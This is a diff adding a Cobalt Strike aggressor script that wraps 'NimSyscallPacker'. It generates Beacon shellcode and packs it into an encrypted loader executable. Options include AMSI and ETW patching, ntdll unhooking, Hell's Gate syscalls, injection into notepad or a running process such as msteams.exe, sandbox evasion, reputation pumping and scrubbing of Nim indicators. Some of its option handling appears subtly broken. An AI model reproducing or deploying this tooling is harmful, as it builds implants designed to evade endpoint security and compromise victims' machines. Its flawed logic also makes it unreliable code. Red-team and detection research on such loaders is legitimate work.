@@ -1,0 +1,155 @@
+sub compile {
+        %options = $3;
+        $packers_folder = getFileParent(script_resource("NimSyscallLoader.cna"));
+
+        # Architecture
+        if (%options["arch86"] eq "true") {
+                $data = artifact_payload(%options["listener"], "raw", "x86");
+                push(@command, "-32")
+        }
+        else {
+                $data = artifact_payload(%options["listener"], "raw", "x64");
+        }
+
+        chdir($packers_folder);
+
+        # Write payload
+        $cradle = openf(">beacon.bin");
+        writeb($cradle, $data);
+        closef($cradle);
+
+        @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin");
+
+        if (%options["COMVARETW"] eq "true") {
+                push(@command, "--COMVARETW")
+        }
+
+        if (%options["noETW"] eq "true") {
+                push(@command, "--noETW")
+        }
+
+        if (%options["noAMSI"] eq "true") {
+                push(@command, "--noAMSI")
+        }
+
+        if (%options["unhook"] eq "true") {
+                push(@command, "--unhook")
+        }
+
+        if (%options["reflective"] eq "true") {
+                push(@command, "--reflective")
+        }
+
+        if (%options["hellsgate"] eq "true") {
+                push(@command, "--hellsgate")
+        }
+
+        if (%options["hide"] eq "true") {
+                push(@command, "--hide")
+        }
+
+        if (%options["remoteinject"] eq "Newly spawned process (notepad)") {
+                push(@command, "--remoteinject")
+                if (%options["remotepatchAMSI"] eq "true"){
+                    push(@command, "--remotepatchAMSI")
+                }
+                if (%options["remotepatchETW"] eq "true"){
+                    push(@command, "--remotepatchETW")
+                }
+        }
+        
+        if (%options["remoteinject"] eq "Existing process" && %options["remoteprocess"] != "") {
+                push(@command, "--remoteinject")
+                push(@command, "--remoteprocess", %options["remoteprocess"])
+                if (%options["remotepatchAMSI"] eq "true"){
+                    push(@command, "--remotepatchAMSI")
+                }
+                if (%options["remotepatchETW"] eq "true"){
+                    push(@command, "--remotepatchETW")
+                }
+        }
+
+        if (%options["sleep"] > 0) {
+                push(@command, "--sleep", %options["sleep"])
+        }
+
+        if (%options["sandbox"] eq "Domain" && %options["domain"] != "") {
+                push(@command, "--sandbox Domain", "--domain", %options["domain"])
+        }
+
+        if (%options["sandbox"] eq "Domain" ) {
+                push(@command, "--sandbox Domain", "--domain", %options["domain"])
+        }
+
+        if (%options["sandbox"] eq "DomainJoined") {
+                push(@command, "--sandbox DomainJoined")
+        }
+
+        if (%options["sandbox"] eq "DiskSpace") {
+                push(@command, "--sandbox DiskSpace")
+        }
+
+        if (%options["sandbox"] eq "MemorySpace") {
+                push(@command, "--sandbox MemorySpace")
+        }
+
+        if (%options["replace"] eq "true") {
+                push(@command, "--replace")
+        }
+
+        if (%options["pump"] eq "words") {
+                push(@command, "--pump words")
+        }
+
+        if (%options["pump"] eq "reputation") {
+                push(@command, "--pump reputation")
+        }   
+
+        if (%options["obfuscatefunctions"] eq "true") {
+                push(@command, "--obfuscatefunctions")
+        }
+
+        exec(@command, $null, $packers_folder);
+        show_message("NimSyscallPacker launched... Loader.exe can be found here: $packers_folder");
+}
+
+
+popup attacks {
+        item "NimSyscallPacker" {
+                local('$dialog %defaults');
+                # setup our defaults
+                %defaults["sleep"] = 0;
+                %defaults["key"] = "TARGETDOMAIN";
+                %defaults["remoteprocess"] = "msteams.exe";
+                %defaults["remotepatchAMSI"] = "true";
+                %defaults["remotepatchETW"] = "true";
+
+                # create our dialog
+                $dialog = dialog("NimSyscallPacker", %defaults, &compile);
+                dialog_description($dialog, "Generate shellcode then encrypt it and pack it into a .exe binary using NimSyscallPacker. Select options below:");
+                drow_listener_stage($dialog, "listener", "Listener: ");
+                drow_text($dialog, "key", "Encryption key: ");
+                drow_checkbox($dialog, "COMVARETW", "Block ETW: ", "Block ETW by setting COMPlus_ETWEnabled to 0");
+                drow_checkbox($dialog, "noETW", "No ETW: ", "Don't use ETW Patch");
+                drow_checkbox($dialog, "noAMSI", "No AMSI: ", "Don't patch AMSI");
+                drow_checkbox($dialog, "unhook", "Unhook: ", "Unhook ntdll.dll before doing anything else for the current process");
+                drow_checkbox($dialog, "reflective", "Reflective: ", "Set compiler flags, so that the Loader Nim binary can be reflectively loaded");
+                drow_checkbox($dialog, "hellsgate", "Hellsgate: ", "Retrieve Syscalls via Hellsgate technique");
+                drow_checkbox($dialog, "hide", "Hide: ", "Compile with --app:gui flag, so that the console won't pop up");
+                drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (notepad)", "Existing process"));
+                drow_text($dialog, "remoteprocess", "--- Remote target process: ", "Injects into the specified remote process name");
+                drow_checkbox($dialog, "remotepatchAMSI", "--- Remote AMSI: ", "Patch AMSI in the remote process before shellcode execution");
+                drow_checkbox($dialog, "remotepatchETW", "--- Remote ETW: ", "Patch ETW in the remote process before shellcode execution");
+                drow_text($dialog, "sleep", "Sleep before decryption: ");
+                drow_combobox($dialog, "sandbox", "Sandbox Evasion: ", @(" -", "Domain", "DomainJoined (any domain)", "DiskSpace >= 200GB", "MemorySpace (more than 4GB RAM available)"));
+                drow_text($dialog, "domain", "--- Sandbox Evasion Domain: ");
+                drow_checkbox($dialog, "replace", "Replace: ", "Replace common nim IoC's in the loader like the string 'nim'");
+                drow_combobox($dialog, "pump", "Pump the file with: ", @(" -", "words", "reputation"));
+                drow_checkbox($dialog, "obfuscatefunctions", "Obfuscate functions: ", "Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator");
+                drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload");
+                dbutton_action($dialog, "Generate encrypted binary");
+
+                # show our dialog
+                dialog_show($dialog);
+        }
+}
